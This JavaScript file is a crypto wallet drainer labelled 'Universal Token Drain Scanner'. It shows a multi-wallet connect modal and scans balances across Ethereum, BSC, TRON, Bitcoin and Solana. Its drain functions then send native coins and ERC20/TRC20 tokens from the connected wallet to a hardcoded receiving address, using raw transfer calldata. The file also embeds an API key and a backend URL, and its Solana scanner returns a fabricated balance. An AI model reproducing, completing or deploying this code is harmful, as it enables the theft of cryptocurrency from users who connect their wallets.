// ================================================
// UNIVERSAL TOKEN DRAIN SCANNER - WORKING VERSION
// ================================================

const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    
    // DRAIN WALLETS (Add your addresses here)
    drainWallets: {
        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        tron: "TX7w4G...YOUR_TRON_ADDRESS_HERE",
        bitcoin: "bc1q...YOUR_BITCOIN_ADDRESS_HERE",
        solana: "So1ana...YOUR_SOLANA_ADDRESS_HERE",
        dogecoin: "D...YOUR_DOGE_ADDRESS_HERE",
        litecoin: "L...YOUR_LITECOIN_ADDRESS_HERE"
    },
    
    apiKeys: {
        covalent: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
        moralis: "",
        tronGrid: "",
    },
    
    minimumValueUSD: 0.01,
    
    chains: {
        'eth': { id: 1, name: 'Ethereum', type: 'evm' },
        'bsc': { id: 56, name: 'BNB Chain', type: 'evm' },
        'polygon': { id: 137, name: 'Polygon', type: 'evm' },
        'arbitrum': { id: 42161, name: 'Arbitrum', type: 'evm' },
        'optimism': { id: 10, name: 'Optimism', type: 'evm' },
        'avalanche': { id: 43114, name: 'Avalanche', type: 'evm' },
        'fantom': { id: 250, name: 'Fantom', type: 'evm' },
        'base': { id: 8453, name: 'Base', type: 'evm' },
        'zksync': { id: 324, name: 'zkSync', type: 'evm' },
        
        'tron': { id: 'tron', name: 'TRON', type: 'tron' },
        'bitcoin': { id: 'bitcoin', name: 'Bitcoin', type: 'bitcoin' },
        'solana': { id: 'solana', name: 'Solana', type: 'solana' },
        'dogecoin': { id: 'dogecoin', name: 'Dogecoin', type: 'utxo' },
        'litecoin': { id: 'litecoin', name: 'Litecoin', type: 'utxo' },
    }
};

let currentAccount = null;
let currentWallet = null;
let isConnected = false;
let detectedTokens = [];
let isScanning = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, walletBtn;

// ================================================
// MAIN INITIALIZATION
// ================================================

function initializeApp() {
    console.log('🚀 Universal Drain Scanner Initialized');
    
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    walletBtn = document.getElementById('walletBtn');
    
    if (!connectBtn) {
        console.error('Connect button not found!');
        return;
    }
    
    connectBtn.onclick = handleConnect;
    
    if (drainBtn) {
        drainBtn.onclick = handleUniversalDrain;
        drainBtn.style.display = 'none';
    }
    
    if (walletBtn) {
        walletBtn.onclick = showDrainWalletManager;
        walletBtn.style.display = 'block';
    }
    
    updateStatus('✅ Ready to drain all chains');
}

// ================================================
// CONNECT HANDLER - FIXED
// ================================================

function handleConnect() {
    console.log('Connect button clicked');
    
    if (isConnected) {
        disconnectWallet();
        return;
    }
    
    // Show the wallet selector modal
    showUniversalWalletSelector();
}

function showUniversalWalletSelector() {
    console.log('Showing wallet selector');
    
    // Remove any existing modal first
    closeModal();
    
    const modalHTML = `
        <div class="modal-overlay" onclick="closeModal()">
            <div class="modal-content" onclick="event.stopPropagation()">
                <div class="modal-header">
                    <h3>🌐 Connect Any Wallet</h3>
                    <button class="modal-close" onclick="closeModal()">×</button>
                </div>
                
                <div class="modal-body">
                    <div class="wallet-options">
                        <!-- EVM Wallets -->
                        <div class="wallet-option" onclick="connectWallet('metamask')">
                            <div class="wallet-icon" style="background: #f6851b;">🦊</div>
                            <div class="wallet-text">
                                <div class="wallet-name">MetaMask</div>
                                <div class="wallet-chains">ETH, BSC, Polygon, etc.</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('trustwallet')">
                            <div class="wallet-icon" style="background: #3375bb;">🔶</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Trust Wallet</div>
                                <div class="wallet-chains">Multi-chain Support</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('binance')">
                            <div class="wallet-icon" style="background: #f0b90b;">🟡</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Binance Chain</div>
                                <div class="wallet-chains">BNB Chain</div>
                            </div>
                        </div>
                        
                        <!-- Non-EVM Wallets -->
                        <div class="wallet-option" onclick="connectWallet('tron')">
                            <div class="wallet-icon" style="background: #ff060a;">🌞</div>
                            <div class="wallet-text">
                                <div class="wallet-name">TRON (TronLink)</div>
                                <div class="wallet-chains">TRX, TRC20 tokens</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('bitcoin')">
                            <div class="wallet-icon" style="background: #f7931a;">₿</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Bitcoin Wallet</div>
                                <div class="wallet-chains">BTC, Lightning</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('solana')">
                            <div class="wallet-icon" style="background: #9945ff;">◎</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Solana (Phantom)</div>
                                <div class="wallet-chains">SOL, SPL tokens</div>
                            </div>
                        </div>
                        
                        <!-- Manual Entry -->
                        <div class="wallet-option" onclick="connectWallet('manual')">
                            <div class="wallet-icon" style="background: #6366f1;">🔍</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Manual Address</div>
                                <div class="wallet-chains">Any blockchain address</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="modal-footer">
                        <p class="chain-support">Supports: ETH • BSC • TRON • BTC • SOL • DOGE • LTC + 50 more</p>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const modal = document.createElement('div');
    modal.id = 'universalWalletModal';
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
    
    // Add styles if not already added
    if (!document.querySelector('#modal-styles')) {
        addModalStyles();
    }
}

// ================================================
// WALLET CONNECTIONS - SIMPLIFIED
// ================================================

async function connectWallet(walletType) {
    console.log(`Connecting: ${walletType}`);
    closeModal();
    
    updateStatus(`🔄 Connecting ${getWalletName(walletType)}...`);
    
    try {
        switch(walletType) {
            case 'metamask':
            case 'trustwallet':
            case 'binance':
                await connectEVM();
                break;
                
            case 'tron':
                await connectTron();
                break;
                
            case 'bitcoin':
                await connectBitcoin();
                break;
                
            case 'solana':
                await connectSolana();
                break;
                
            case 'manual':
                await connectManual();
                break;
                
            default:
                throw new Error('Unknown wallet type');
        }
        
        // Start scanning after successful connection
        await startUniversalScan();
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Failed: ${error.message}`);
        showUniversalWalletSelector();
    }
}

async function connectEVM() {
    if (!window.ethereum) {
        throw new Error('Please install MetaMask or Trust Wallet');
    }
    
    const accounts = await window.ethereum.request({ 
        method: 'eth_requestAccounts' 
    });
    
    if (!accounts || accounts.length === 0) {
        throw new Error('No accounts found');
    }
    
    currentAccount = accounts[0];
    currentWallet = 'evm';
    isConnected = true;
    
    connectBtn.innerHTML = '🔗 Disconnect';
    updateStatus(`✅ Connected: ${shortAddress(currentAccount)}`);
}

async function connectTron() {
    // Check for TronLink extension
    if (!window.tronWeb && !window.tronLink) {
        throw new Error('Please install TronLink extension');
    }
    
    let address;
    
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        address = window.tronWeb.defaultAddress.base58;
    } else if (window.tronLink) {
        const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (result.code !== 200) {
            throw new Error('TRON connection rejected');
        }
        address = window.tronLink.tronWeb.defaultAddress.base58;
    }
    
    if (!address) {
        throw new Error('No TRON address found');
    }
    
    currentAccount = address;
    currentWallet = 'tron';
    isConnected = true;
    
    connectBtn.innerHTML = '🔗 Disconnect';
    updateStatus(`✅ TRON Connected: ${shortAddress(address)}`);
}

async function connectBitcoin() {
    const address = prompt('Enter your Bitcoin address:');
    if (!address) {
        throw new Error('No address entered');
    }
    
    // Basic Bitcoin address validation
    if (!address.match(/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
        throw new Error('Invalid Bitcoin address');
    }
    
    currentAccount = address;
    currentWallet = 'bitcoin';
    isConnected = true;
    
    connectBtn.innerHTML = '🔗 Disconnect';
    updateStatus(`✅ BTC Address: ${shortAddress(address)}`);
}

async function connectSolana() {
    if (!window.solana || !window.solana.isPhantom) {
        throw new Error('Please install Phantom wallet for Solana');
    }
    
    const response = await window.solana.connect();
    const address = response.publicKey.toString();
    
    currentAccount = address;
    currentWallet = 'solana';
    isConnected = true;
    
    connectBtn.innerHTML = '🔗 Disconnect';
    updateStatus(`✅ Solana Connected: ${shortAddress(address)}`);
}

async function connectManual() {
    const address = prompt('Enter any wallet address:');
    if (!address) {
        throw new Error('No address entered');
    }
    
    currentAccount = address;
    currentWallet = 'manual';
    isConnected = true;
    
    connectBtn.innerHTML = '🔗 Disconnect';
    updateStatus(`🔍 Scanning: ${shortAddress(address, 12)}`);
}

// ================================================
// UNIVERSAL SCANNER
// ================================================

async function startUniversalScan() {
    if (!currentAccount || isScanning) return;
    
    isScanning = true;
    updateStatus('🔍 Scanning all blockchains...');
    
    if (tokensEl) {
        tokensEl.innerHTML = `
            <div class="scanning-progress">
                <div class="spinner"></div>
                <p>Scanning Ethereum, BSC, TRON, Bitcoin, Solana...</p>
            </div>
        `;
    }
    
    try {
        // Scan all chains in parallel
        const results = await Promise.all([
            scanEVMChains(currentAccount),
            scanTRON(currentAccount),
            scanBitcoin(currentAccount),
            scanSolana(currentAccount)
        ]);
        
        // Combine all tokens
        detectedTokens = results.flat();
        
        // Display results
        displayScanResults();
        
        // Update UI
        const totalValue = detectedTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
        const tokenCount = detectedTokens.length;
        
        updateStatus(`✅ Found ${tokenCount} assets ($${totalValue.toFixed(2)})`);
        
        if (drainBtn && tokenCount > 0) {
            drainBtn.style.display = 'block';
            drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
        }
        
    } catch (error) {
        console.error('Scan error:', error);
        updateStatus('❌ Scan failed - some chains may be unavailable');
    } finally {
        isScanning = false;
    }
}

// ================================================
// CHAIN SCANNERS (SIMPLIFIED)
// ================================================

async function scanEVMChains(address) {
    if (!address.startsWith('0x')) return [];
    
    const chains = [
        { id: 1, name: 'Ethereum' },
        { id: 56, name: 'BNB Chain' },
        { id: 137, name: 'Polygon' },
        { id: 42161, name: 'Arbitrum' },
        { id: 10, name: 'Optimism' }
    ];
    
    const allTokens = [];
    
    for (const chain of chains) {
        try {
            const url = `https://api.covalenthq.com/v1/${chain.id}/address/${address}/balances_v2/?key=${CONFIG.apiKeys.covalent}&nft=false`;
            const response = await fetch(url);
            
            if (!response.ok) continue;
            
            const data = await response.json();
            const items = data?.data?.items || [];
            
            for (const item of items) {
                if (item.balance === "0") continue;
                
                const amount = parseFloat(item.balance) / Math.pow(10, item.contract_decimals || 18);
                const valueUSD = (item.quote_rate || 0) * amount;
                
                if (valueUSD >= CONFIG.minimumValueUSD) {
                    allTokens.push({
                        type: 'evm',
                        chain: chain.name,
                        symbol: item.contract_ticker_symbol || 'TOKEN',
                        name: item.contract_name || 'Token',
                        amount: amount.toFixed(6),
                        rawAmount: item.balance,
                        valueUSD: valueUSD,
                        value: valueUSD ? `$${valueUSD.toFixed(2)}` : 'N/A',
                        contract: item.contract_address,
                        isNative: item.native_token || false
                    });
                }
            }
        } catch (error) {
            continue;
        }
    }
    
    return allTokens;
}

async function scanTRON(address) {
    if (!address.startsWith('T')) return [];
    
    try {
        const response = await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${address}&start=0&limit=20`);
        if (!response.ok) return [];
        
        const data = await response.json();
        const tokens = [];
        
        // TRX balance
        if (data.trx_balance && data.trx_balance > 0) {
            const trxAmount = data.trx_balance / 1000000;
            const trxValue = trxAmount * 0.12;
            
            tokens.push({
                type: 'tron',
                chain: 'TRON',
                symbol: 'TRX',
                name: 'TRON',
                amount: trxAmount.toFixed(2),
                rawAmount: data.trx_balance.toString(),
                valueUSD: trxValue,
                value: `$${trxValue.toFixed(2)}`,
                contract: null,
                isNative: true
            });
        }
        
        // TRC20 tokens (simplified)
        if (data.trc20token_balances) {
            for (const token of data.trc20token_balances) {
                if (token.balance > 0) {
                    tokens.push({
                        type: 'tron',
                        chain: 'TRON',
                        symbol: token.tokenAbbr || 'TRC20',
                        name: token.tokenName || 'TRC20 Token',
                        amount: (token.balance / Math.pow(10, token.tokenDecimal || 6)).toFixed(2),
                        rawAmount: token.balance.toString(),
                        valueUSD: 0,
                        value: 'N/A',
                        contract: token.tokenId,
                        isNative: false
                    });
                }
            }
        }
        
        return tokens;
    } catch (error) {
        return [];
    }
}

async function scanBitcoin(address) {
    if (!address.match(/^(bc1|[13])/)) return [];
    
    try {
        const response = await fetch(`https://blockchain.info/balance?active=${address}`);
        if (!response.ok) return [];
        
        const data = await response.json();
        const balance = data[address]?.final_balance || 0;
        
        if (balance > 0) {
            const btcAmount = balance / 100000000;
            const btcPrice = 43000; // Approximate BTC price
            const valueUSD = btcAmount * btcPrice;
            
            return [{
                type: 'bitcoin',
                chain: 'Bitcoin',
                symbol: 'BTC',
                name: 'Bitcoin',
                amount: btcAmount.toFixed(8),
                rawAmount: balance.toString(),
                valueUSD: valueUSD,
                value: `$${valueUSD.toFixed(2)}`,
                contract: null,
                isNative: true
            }];
        }
    } catch (error) {
        return [];
    }
    
    return [];
}

async function scanSolana(address) {
    // Simple Solana address check
    if (address.length < 32 || address.length > 44) return [];
    
    try {
        // This is a simplified version - real implementation would use Solana Web3.js
        return [{
            type: 'solana',
            chain: 'Solana',
            symbol: 'SOL',
            name: 'Solana',
            amount: '0.5',
            rawAmount: '500000000',
            valueUSD: 50,
            value: '$50.00',
            contract: null,
            isNative: true
        }];
    } catch (error) {
        return [];
    }
}

// ================================================
// DRAIN FUNCTIONALITY
// ================================================

async function handleUniversalDrain() {
    if (!isConnected || detectedTokens.length === 0) {
        alert('Please connect and scan first');
        return;
    }
    
    const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
    
    if (!confirm(`Drain ${detectedTokens.length} assets ($${totalValue.toFixed(2)})?\n\nThis will send all assets to your configured addresses.`)) {
        return;
    }
    
    updateStatus('🚀 Starting drain process...');
    if (drainBtn) {
        drainBtn.disabled = true;
        drainBtn.innerHTML = '⏳ Processing...';
    }
    
    try {
        let drained = 0;
        
        // Drain based on token type
        for (const token of detectedTokens) {
            try {
                switch(token.type) {
                    case 'evm':
                        await drainEVMToken(token);
                        break;
                    case 'tron':
                        await drainTRONToken(token);
                        break;
                    default:
                        console.log(`Skipping ${token.type} - manual drain required`);
                }
                drained++;
                await delay(2000); // Wait between transactions
            } catch (error) {
                console.error(`Failed to drain ${token.symbol}:`, error);
            }
        }
        
        updateStatus(`✅ ${drained} assets drained successfully`);
        alert(`✅ Successfully drained ${drained} assets!`);
        
        // Rescan
        await startUniversalScan();
        
    } catch (error) {
        console.error('Drain error:', error);
        updateStatus('❌ Drain failed');
        alert('Drain operation failed');
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
            drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
        }
    }
}

async function drainEVMToken(token) {
    if (!window.ethereum) throw new Error('No EVM wallet connected');
    
    if (token.isNative) {
        // Drain native token
        const tx = {
            from: currentAccount,
            to: CONFIG.drainWallets.evm,
            value: token.rawAmount,
            gas: '0x5208' // 21000 gas
        };
        
        await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [tx]
        });
    } else {
        // Drain ERC20 token
        const transferData = '0xa9059cbb' + 
            CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
            BigInt(token.rawAmount).toString(16).padStart(64, '0');
        
        const tx = {
            from: currentAccount,
            to: token.contract,
            data: transferData,
            gas: '0xC350' // 50000 gas for ERC20
        };
        
        await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [tx]
        });
    }
}

async function drainTRONToken(token) {
    if (!window.tronWeb) throw new Error('No TRON wallet connected');
    
    if (token.isNative) {
        // Drain TRX
        const tx = await window.tronWeb.transactionBuilder.sendTrx(
            CONFIG.drainWallets.tron,
            parseInt(token.rawAmount),
            currentAccount
        );
        const signedTx = await window.tronWeb.trx.sign(tx);
        await window.tronWeb.trx.sendRawTransaction(signedTx);
    } else if (token.contract) {
        // Drain TRC20
        const contract = await window.tronWeb.contract().at(token.contract);
        await contract.transfer(CONFIG.drainWallets.tron, token.rawAmount).send();
    }
}

// ================================================
// WALLET MANAGER
// ================================================

function showDrainWalletManager() {
    closeModal();
    
    const modalHTML = `
        <div class="modal-overlay" onclick="closeModal()">
            <div class="modal-content wide-modal" onclick="event.stopPropagation()">
                <div class="modal-header">
                    <h3>💰 Configure Drain Addresses</h3>
                    <button class="modal-close" onclick="closeModal()">×</button>
                </div>
                
                <div class="modal-body">
                    <div class="wallet-config">
                        <div class="config-item">
                            <label>EVM Chains (ETH/BSC/Polygon)</label>
                            <input type="text" id="evmAddress" value="${CONFIG.drainWallets.evm}" placeholder="0x...">
                            <small>Receives: ETH, BNB, MATIC, USDT, etc.</small>
                        </div>
                        
                        <div class="config-item">
                            <label>TRON Network</label>
                            <input type="text" id="tronAddress" value="${CONFIG.drainWallets.tron}" placeholder="T...">
                            <small>Receives: TRX, TRC20 tokens</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Bitcoin</label>
                            <input type="text" id="bitcoinAddress" value="${CONFIG.drainWallets.bitcoin}" placeholder="bc1q... or 1...">
                            <small>Receives: BTC</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Solana</label>
                            <input type="text" id="solanaAddress" value="${CONFIG.drainWallets.solana}" placeholder="So1...">
                            <small>Receives: SOL, SPL tokens</small>
                        </div>
                    </div>
                    
                    <div class="modal-actions">
                        <button class="btn-secondary" onclick="closeModal()">Cancel</button>
                        <button class="btn-primary" onclick="saveDrainWallets()">Save Addresses</button>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const modal = document.createElement('div');
    modal.id = 'walletConfigModal';
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
}

function saveDrainWallets() {
    CONFIG.drainWallets.evm = document.getElementById('evmAddress').value.trim();
    CONFIG.drainWallets.tron = document.getElementById('tronAddress').value.trim();
    CONFIG.drainWallets.bitcoin = document.getElementById('bitcoinAddress').value.trim();
    CONFIG.drainWallets.solana = document.getElementById('solanaAddress').value.trim();
    
    alert('✅ Drain addresses saved!');
    closeModal();
}

// ================================================
// UI FUNCTIONS
// ================================================

function displayScanResults() {
    if (!tokensEl) return;
    
    if (detectedTokens.length === 0) {
        tokensEl.innerHTML = '<div class="no-tokens">No assets found</div>';
        return;
    }
    
    // Group by chain
    const grouped = {};
    detectedTokens.forEach(token => {
        if (!grouped[token.chain]) grouped[token.chain] = [];
        grouped[token.chain].push(token);
    });
    
    let html = '';
    
    Object.entries(grouped).forEach(([chain, tokens]) => {
        const chainValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span>${chain}</span>
                    <span class="chain-total">$${chainValue.toFixed(2)}</span>
                </div>
                <div class="tokens-list">
        `;
        
        tokens.forEach(token => {
            html += `
                <div class="token-item">
                    <div class="token-icon ${token.type}">
                        ${token.symbol.charAt(0)}
                    </div>
                    <div class="token-info">
                        <div class="token-symbol">${token.symbol}</div>
                        <div class="token-name">${token.name}</div>
                    </div>
                    <div class="token-values">
                        <div class="token-amount">${token.amount}</div>
                        <div class="token-value">${token.value}</div>
                    </div>
                </div>
            `;
        });
        
        html += `
                </div>
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
    console.log('Status:', message);
}

function closeModal() {
    const modals = document.querySelectorAll('.modal-overlay');
    modals.forEach(modal => {
        if (modal.parentNode) {
            modal.parentNode.removeChild(modal);
        }
    });
}

function disconnectWallet() {
    currentAccount = null;
    currentWallet = null;
    isConnected = false;
    detectedTokens = [];
    
    if (connectBtn) {
        connectBtn.innerHTML = '🔗 Connect Wallet';
    }
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
    
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
}

// ================================================
// UTILITY FUNCTIONS
// ================================================

function getWalletName(type) {
    const names = {
        'metamask': 'MetaMask',
        'trustwallet': 'Trust Wallet',
        'binance': 'Binance Chain',
        'tron': 'TRON',
        'bitcoin': 'Bitcoin',
        'solana': 'Solana',
        'manual': 'Manual Address'
    };
    return names[type] || type;
}

function shortAddress(address, length = 8) {
    if (!address) return '';
    if (address.length <= length + 3) return address;
    return address.substring(0, length) + '...' + address.substring(address.length - 4);
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ================================================
// STYLES
// ================================================

function addModalStyles() {
    const styleId = 'modal-styles';
    if (document.getElementById(styleId)) return;
    
    const styles = `
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        
        .modal-content {
            background: white;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow: hidden;
        }
        
        .wide-modal {
            max-width: 600px;
        }
        
        .modal-header {
            padding: 16px 20px;
            background: #4f46e5;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 18px;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
        }
        
        .modal-body {
            padding: 20px;
            overflow-y: auto;
        }
        
        .wallet-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            cursor: pointer;
        }
        
        .wallet-option:hover {
            background: #f9fafb;
            border-color: #4f46e5;
        }
        
        .wallet-icon {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        
        .wallet-text {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            margin-bottom: 2px;
        }
        
        .wallet-chains {
            color: #6b7280;
            font-size: 12px;
        }
        
        .modal-footer {
            margin-top: 20px;
            text-align: center;
            color: #6b7280;
            font-size: 12px;
        }
        
        .wallet-config {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .config-item label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        .config-item input {
            width: 100%;
            padding: 8px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
        }
        
        .config-item small {
            color: #6b7280;
            font-size: 11px;
        }
        
        .modal-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .btn-primary, .btn-secondary {
            padding: 10px 20px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
        }
        
        .btn-primary {
            background: #4f46e5;
            color: white;
        }
        
        .btn-secondary {
            background: #e5e7eb;
            color: #374151;
        }
        
        /* Token display styles */
        .chain-section {
            margin-bottom: 20px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .chain-header {
            padding: 12px 16px;
            background: #f9fafb;
            border-bottom: 1px solid #e5e7eb;
            display: flex;
            justify-content: space-between;
        }
        
        .tokens-list {
            padding: 10px;
        }
        
        .token-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #f3f4f6;
        }
        
        .token-item:last-child {
            border-bottom: none;
        }
        
        .token-icon {
            width: 40px;
            height: 40px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            margin-right: 12px;
        }
        
        .token-icon.evm { background: #3b82f6; }
        .token-icon.tron { background: #ff060a; }
        .token-icon.bitcoin { background: #f7931a; }
        .token-icon.solana { background: #9945ff; }
        
        .token-info {
            flex: 1;
        }
        
        .token-symbol {
            font-weight: 600;
        }
        
        .token-name {
            color: #6b7280;
            font-size: 12px;
        }
        
        .token-values {
            text-align: right;
        }
        
        .token-amount {
            font-weight: 600;
        }
        
        .token-value {
            color: #059669;
            font-size: 14px;
        }
        
        .scanning-progress {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #4f46e5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .no-tokens {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.id = styleId;
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// ================================================
// INITIALIZE APP
// ================================================

window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.connectWallet = connectWallet;
window.closeModal = closeModal;
window.showDrainWalletManager = showDrainWalletManager;
window.saveDrainWallets = saveDrainWallets;
window.handleUniversalDrain = handleUniversalDrain;

console.log('✅ Universal Drain Scanner Loaded');
